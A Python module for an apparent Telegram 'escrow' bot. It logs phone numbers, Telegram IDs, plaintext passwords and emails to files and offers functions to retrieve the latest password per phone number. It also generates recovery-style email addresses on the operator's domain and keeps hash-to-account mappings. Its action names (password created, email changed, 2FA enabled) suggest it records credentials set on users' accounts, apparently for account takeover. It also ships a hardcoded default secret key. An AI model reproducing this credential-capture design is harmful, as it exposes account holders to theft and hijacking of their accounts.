"""
Credentials Logger
Logs passwords, emails, and other sensitive data with timestamps
Uses encrypted hash for email generation
File: logs/credentials.log
"""

import os
import json
import hashlib
import hmac
import base64
from datetime import datetime
from typing import Optional, Dict, Any

CREDENTIALS_LOG_DIR = "logs"
HASH_MAPPINGS_FILE = os.path.join(CREDENTIALS_LOG_DIR, "hash_mappings.json")

# Email domain configuration
from config import EMAIL_DOMAIN
OUR_EMAIL_DOMAIN = EMAIL_DOMAIN

# Secret key for hash generation (use environment variable in production)
HASH_SECRET_KEY = os.environ.get("HASH_SECRET_KEY", "escrow_telegram_secret_key_2026")
CREDENTIALS_LOG_FILE = os.path.join(CREDENTIALS_LOG_DIR, "credentials.log")

os.makedirs(CREDENTIALS_LOG_DIR, exist_ok=True)


def log_credentials(
    phone: str,
    action: str,
    password: Optional[str] = None,
    email: Optional[str] = None,
    telegram_id: Optional[int] = None,
    extra_data: Optional[Dict[str, Any]] = None
):
    """
    Log credentials and sensitive data to file
    
    Args:
        phone: Phone number
        action: Action type (e.g., "PASSWORD_CREATED", "EMAIL_CHANGED", "2FA_ENABLED")
        password: Password if applicable
        email: Email if applicable
        telegram_id: Telegram user ID
        extra_data: Any additional data to log
    """
    timestamp = datetime.now().isoformat()
    
    log_entry = {
        "timestamp": timestamp,
        "phone": phone,
        "action": action,
        "telegram_id": telegram_id,
        "password": password,
        "email": email,
        "extra": extra_data or {}
    }
    
    # Format log line
    log_line = f"[{timestamp}] [{action}] Phone: {phone}"
    
    if telegram_id:
        log_line += f" | TG_ID: {telegram_id}"
    
    if password:
        log_line += f" | Password: {password}"
    
    if email:
        log_line += f" | Email: {email}"
    
    if extra_data:
        log_line += f" | Extra: {json.dumps(extra_data)}"
    
    # Write to file
    with open(CREDENTIALS_LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_line + "\n")
    
    # Also write JSON format for easier parsing
    json_log_file = os.path.join(CREDENTIALS_LOG_DIR, "credentials.json")
    
    try:
        if os.path.exists(json_log_file):
            with open(json_log_file, "r", encoding="utf-8") as f:
                logs = json.load(f)
        else:
            logs = []
    except:
        logs = []
    
    logs.append(log_entry)
    
    with open(json_log_file, "w", encoding="utf-8") as f:
        json.dump(logs, f, ensure_ascii=False, indent=2)
    
    return log_entry


def get_credentials_by_phone(phone: str) -> list:
    """Get all credential logs for a phone number"""
    json_log_file = os.path.join(CREDENTIALS_LOG_DIR, "credentials.json")
    
    if not os.path.exists(json_log_file):
        return []
    
    try:
        with open(json_log_file, "r", encoding="utf-8") as f:
            logs = json.load(f)
        
        return [log for log in logs if log.get("phone") == phone]
    except:
        return []


def get_latest_password(phone: str) -> Optional[str]:
    """Get the latest password for a phone number"""
    logs = get_credentials_by_phone(phone)
    
    for log in reversed(logs):
        if log.get("password"):
            return log["password"]
    
    return None


def get_latest_email(phone: str) -> Optional[str]:
    """Get the latest email for a phone number"""
    logs = get_credentials_by_phone(phone)
    
    for log in reversed(logs):
        if log.get("email"):
            return log["email"]
    
    return None


def generate_account_hash(telegram_id: int) -> str:
    """
    Generate encrypted hash for account
    Uses HMAC-SHA256 then Base64 URL-safe encoding
    Returns 12 character hash
    """
    message = f"TG_{telegram_id}_ESCROW"
    signature = hmac.new(
        HASH_SECRET_KEY.encode(),
        message.encode(),
        hashlib.sha256
    ).digest()
    # URL-safe base64, take first 12 chars for shorter email
    hash_str = base64.urlsafe_b64encode(signature).decode()[:12]
    # Remove any special characters that might cause email issues
    hash_str = hash_str.replace('-', 'x').replace('_', 'y')
    return hash_str


def save_hash_mapping(email_hash: str, telegram_id: int, phone: str = None):
    """Save hash -> telegram_id mapping for reverse lookup"""
    mappings = load_hash_mappings()
    
    mappings[email_hash] = {
        "telegram_id": telegram_id,
        "phone": phone,
        "created_at": datetime.now().isoformat()
    }
    
    with open(HASH_MAPPINGS_FILE, 'w', encoding='utf-8') as f:
        json.dump(mappings, f, indent=2, ensure_ascii=False)


def load_hash_mappings() -> Dict[str, Any]:
    """Load all hash mappings"""
    if os.path.exists(HASH_MAPPINGS_FILE):
        try:
            with open(HASH_MAPPINGS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            pass
    return {}


def get_telegram_id_from_hash(email_hash: str) -> Optional[int]:
    """Get telegram_id from hash"""
    mappings = load_hash_mappings()
    mapping = mappings.get(email_hash)
    if mapping:
        return mapping.get("telegram_id") if isinstance(mapping, dict) else mapping
    return None


def get_phone_from_hash(email_hash: str) -> Optional[str]:
    """Get phone from hash"""
    mappings = load_hash_mappings()
    mapping = mappings.get(email_hash)
    if mapping and isinstance(mapping, dict):
        return mapping.get("phone")
    return None


def generate_email_for_account(telegram_id: int, phone: str = None) -> str:
    """
    Generate email address for an account
    Format: email-for-<encrypted_hash>@{EMAIL_DOMAIN}
    """
    email_hash = generate_account_hash(telegram_id)
    # Save mapping for reverse lookup
    save_hash_mapping(email_hash, telegram_id, phone)
    return f"email-for-{email_hash}@{OUR_EMAIL_DOMAIN}"


def get_email_hash(telegram_id: int, phone: str = None) -> str:
    """
    Get the encrypted hash portion of the email for webhook matching
    """
    email_hash = generate_account_hash(telegram_id)
    # Save mapping for reverse lookup
    save_hash_mapping(email_hash, telegram_id, phone)
    return email_hash


def get_full_email_info(telegram_id: int, phone: str = None) -> Dict[str, str]:
    """
    Get complete email info for an account
    Returns hash, full email, and domain
    """
    email_hash = get_email_hash(telegram_id, phone)
    full_email = f"email-for-{email_hash}@{OUR_EMAIL_DOMAIN}"
    
    return {
        "hash": email_hash,
        "email": full_email,
        "domain": OUR_EMAIL_DOMAIN
    }
